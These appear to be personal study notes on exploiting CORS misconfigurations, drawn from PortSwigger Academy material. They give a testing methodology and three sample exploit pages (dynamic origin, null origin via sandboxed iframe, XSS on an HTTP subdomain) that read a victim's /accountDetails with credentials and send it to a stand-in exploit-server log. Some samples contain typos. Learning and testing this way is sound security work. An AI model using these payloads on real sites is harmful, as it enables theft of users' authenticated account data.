# References
- [Cross-Origin Resource Sharing - Rana Khalil](https://www.youtube.com/watch?v=t5FBwq-kudw)
- [Portswigger Academy](https://portswigger.net/web-security/cors)

# CORS headers
- `Access-Control-Allow-Origin` header: Specifies if the origin is allowed to access the resources of the website. Only access public pages.
- The values could be:
```
*
<origin>
null
```
- Each with its security implications
- `Access-Control-Allow-Credentials: true` Allow authenticated pages
- Note: if`Access-Control-Allow-Origin` is set to `*` then the `Access-Control-Allow-Credentials` header is not allowed

# CORS Vulnerabilities
- The Access-Control-Allow-Origin header only allows to whitelist one origin, this is a limitation that developers need to circumvent
- They use `dynamic generation` to address this limitation
- The logic of how an origin is decided to be trusted is what causes the misconfigurations
## Testing Methodology
- Find a request disclosing sensitive information
- Inject the Origin header and start testing different url options
- Look at server responses and check for "Access-Control-Allow-Origin" or "Access-Control-Allow-Credentials"
- Add or change the origin header to set the current host as a subdomain of an attacker controlled domain "current-host.net.attacker-site.com" and observe the server response
- Add or change the origin header to a subdomain of the current Host value and observe the server response
- Add or change the origin header to an arbitrary value and observe the server response
- Add or change the origin header to "null" value and observe the server response

# Samples
1. Dynamic generation
```html
<html>
    <body>
        <h1>Hello World!</h1>
        <script>
        var xhr = new XMLHttpRequest();
        var url = "https://vulnerable-site.com"
        xhr.onreadoystatechange = function() {
            if (xhr.readyState == XMLHttpRequest.DONE) {
                fetch("/log?key=" + xhr.responseText)
            }
        }
        xhr.open('GET', url + "/accountDetails", true);
        xhr.withCrendentials = true;
        xhr.send(null);
        </script>
    </body>
</html>
```

2. Null whitelisted: use an iframe. In the second "x.open" specify the full PATH of the exploit server since the request is coming from a sandboxed iframe
```html
<html>
    <body>
        <h1>Hello World!</h1>
        <iframe style="display: none" sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
        xhr=new XMLHttpRequest();
        xhr.onload=function(){
            const x=new XMLHttpRequest()
            x.open('GET', 'https://exploit-server.net/log?key='+btoa(this.responseText))
            x.send()
        }
        xhr.open('GET', 'https://vulnerable-site/accountDetails', true);
        xhr.withCredentials = true;
        xhr.send();
        </script>"></iframe>
    </body>
</html>

```
3. Insecure HTTP protocol in CORS policy + subdomain vulnerable to XSS
```html
<html>
    <body>
        <script>
        document.location='http://subdomain.vulnerable-website.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://vulnerable-website.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1'
        </script>
    </body>
</html>
```
# Extras to read
- https://quitten.github.io/StackStorm/
- https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties
- https://blog.saynotolinux.com/blog/2016/08/15/jetbrains-ide-remote-code-execution-and-local-file-disclosure-vulnerability-analysis/
